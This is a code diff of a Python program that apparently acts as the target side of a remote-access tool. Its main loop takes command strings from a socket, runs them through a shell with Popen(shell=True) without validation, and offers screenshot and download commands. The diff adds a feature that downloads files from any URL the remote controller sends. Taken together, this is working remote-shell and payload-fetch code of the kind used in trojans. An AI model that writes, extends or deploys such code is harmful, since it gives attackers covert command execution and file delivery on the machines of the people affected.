@@ -15,6 +15,7 @@ from subprocess import *
 
 import command
 import constant
+import downloader
 import logger
 
 
@@ -62,12 +63,12 @@ def main():
             if not data:
                 break
 
-            in_cmd = data.decode(constant.DECODE_TYPE)
+            full_cmd = data.decode(constant.DECODE_TYPE)
             data_str = str(data)
             logger.info(f"Received: {data_str}");
 
 
-            cmd, params = command.get_cmd_params(in_cmd)
+            cmd, params = command.get_cmd_params(full_cmd)
 
             # Check if is internal command type.
             iicp = command.is_internal_command_prefix(cmd)
@@ -77,7 +78,7 @@ def main():
                 rl_cmd = cmd[1:]
                 iic = command.is_internal_command(rl_cmd)
                 if not iic:
-                    logger.error(f"'{in_cmd}' is not recognized internal command.")
+                    logger.error(f"'{full_cmd}' is not recognized internal command.")
 
 
             output = "** Default output command... **".encode(constant.ENCODE_TYPE)
@@ -90,10 +91,12 @@ def main():
                 if rl_cmd == command.Command.SCREENSHOT.value:
                     logger.info("Taking screenshot...")
                 if rl_cmd == command.Command.DOWNLOAD.value:
-                    logger.info("Downloading file...")
+                    # TODO(jenchieh): Need defense programming?
+                    url = params[0]
+                    downloader.download(url)
             else:
-                if "cd" in in_cmd:
-                    cd_path = params[1]
+                if "cd" in full_cmd:
+                    cd_path = params[0]
                     if ".." in cd_path:
                         os.chdir("..")
                     elif os.path.isdir(cd_path):
@@ -101,7 +104,7 @@ def main():
                     continue
 
                 # Execute shell command.
-                proc = Popen(in_cmd, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+                proc = Popen(full_cmd, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
                 outs, errs = proc.communicate()
 
                 if outs:
@@ -114,6 +117,7 @@ def main():
 
         s.shutdown(socket.SHUT_RDWR)
         s.close()
+
         logger.info("Target program exits.")
 
 if __name__ == "__main__":
